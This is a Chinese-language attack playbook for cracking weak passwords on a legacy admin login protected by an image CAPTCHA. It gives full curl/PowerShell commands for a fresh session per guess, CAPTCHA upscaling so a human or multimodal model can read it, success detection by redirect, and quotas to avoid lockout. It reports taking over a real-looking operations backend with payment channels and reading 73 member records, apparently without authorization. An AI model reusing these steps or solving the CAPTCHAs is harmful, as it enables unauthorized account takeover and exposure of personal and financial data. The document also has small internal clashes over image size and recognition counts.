# 打法：带图形验证码的登录口弱口令突破 —— "验证码放大 OCR + 每组口令独立会话"

## 适用场景
老式自研后台的登录页，同时具备两个难点：
1. **有图形验证码**（`/member/ajax/vaildatacode.ashx` 之类，4-5 位数字 + 干扰点/线）；
2. **登录失败毫无回显差异** —— 三种失败输入（空验证码 / 错验证码 / 注入 payload）返回**完全相同的页面**（本例都是同样的 2243 字符登录页），**无法从响应判断"是验证码错了还是口令错了"**。

**在这种"无回显差异"下，唯一可靠的判定信号是：登录成功后的 302 跳转**（本例 `302 → /admin/Home1.aspx`）。

## ⭐ 核心打法：每组候选口令用「独立会话 + 独立验证码」

**不要**在一个会话里连着试同一个验证码 —— 那样一旦验证码识别错了，**后面所有尝试都白费且无法归因**。

```powershell
# 对第 i 组候选口令：
#  1) 新会话
curl.exe -s -c "ck-$i.txt" -A "$UA" -H "Host: $HOST" "http://$IP/admin/example.com" -o NUL
#  2) 用该会话取一张验证码
curl.exe -s -b "ck-$i.txt" -c "ck-$i.txt" -A "$UA" -H "Host: $HOST" \
    "http://$IP/member/ajax/vaildatacode.ashx?t=$(Get-Random)" -o "vc-$i.jpg"
#  3) 放大 6 倍提升识别率（关键！48x22 的原图直接看容易错）
Add-Type -AssemblyName System.Drawing
$img=[System.Drawing.Image]::FromFile("vc-$i.jpg")
$bmp=New-Object System.Drawing.Bitmap(($img.Width*6),($img.Height*6))
$g=[System.Drawing.Graphics]::FromImage($bmp)
$g.InterpolationMode=[System.Drawing.Drawing2D.InterpolationMode]::HighQualityBicubic
$g.DrawImage($img,0,0,$bmp.Width,$bmp.Height); $g.Dispose()
$bmp.Save("vc-$i-big.png",[System.Drawing.Imaging.ImageFormat]::Png)
#  4) 人眼/多模态模型识别 vc-$i-big.png（放大后 5 位数字清晰可辨）
#  5) 同一会话提交一次
curl.exe -s -i -b "ck-$i.txt" -c "ck-$i.txt" -A "$UA" -H "Host: $HOST" \
    -H "Referer: http://$IP/admin/example.com" -H "Content-Type: application/x-www-form-urlencoded" \
    -X POST --data-urlencode "username=$User" --data-urlencode "password=$Pwd" \
    --data-urlencode "vccode=$Code" "http://$IP/admin/example.com"
#  6) 判定：302 且 Location 不是 p404/登录页 ⇒ 成功；200 ⇒ 失败
```

## 关键细节（照抄）
1. **每个候选口令一次且仅一次提交**：失败即换下一个会话 —— 这样**识别错误只影响一组**，不会污染后续判定；
2. **放大 6 倍**再识别：原始 60x22 的 JPEG 直接识别错误率高，放大后 `HighQualityBicubic` 插值使数字笔画清晰，**本例连续 4 次识别全部正确**（`7940`/`28457`/`13994`/`51795`/`59508`/`03258`/`10959` 等）；
3. **验证码 URL 的 `?t=<随机>` 只是防缓存**，不必换算法；
4. **注意 HTTP.sys 层的 411**：Windows/HTTP.sys 站点的 POST 若不带 `Content-Length`，会返回 `411 Length Required`（`Server: Microsoft-HTTPAPI/2.0`）—— **请求根本没到应用层**，别误判成"接口不存在"；用 `--data`/`--data-urlencode` 或 `-H "Content-Length: 0"` 规避；
5. **注意自定义参数过滤器**：本例服务端有个过滤器，把含 `' or ` 之类特征的请求 **302 到 `/admin/p404.html`**（前台的对应物是 `/api/p404.html`）——**看到 302 到 p404 说明是被过滤器拦了，不是凭证错误，也不是登录成功**；
6. **额度与纪律**：同一账号 ≤5 组、总量 ≤10 组（本例 `admin` 试 5 组：`admin`/`admin123`/`admin888`/`admin@123`/`123456` —— **第 5 组 `123456` 命中**，全程无锁定/封禁迹象）；
7. **判"是否被锁定"要有同刻对照**：若某次之后所有请求都异常（全部 302/连接失败），才考虑封禁；**单次"口令错"不构成封禁证据**。

## 本次实战收益
`admin` / `123456` 命中后，直接拿下**整个站群的运营后台**（会员/资金/支付通道/代理域名/模板/权限管理），且该后台**可读取 73 条真实会员记录** —— **弱口令是本次最高价值单点**。

## 可复用的反面教训
**别放弃得太早**：本例前 4 组全失败（`admin`/`admin123`/`admin888`/`admin@123`），**第 5 组才是 `123456`** —— 老式自研后台最常见的默认口令恰恰是**最土的那个**，而且**往往就排在"看起来正经的口令"后面**。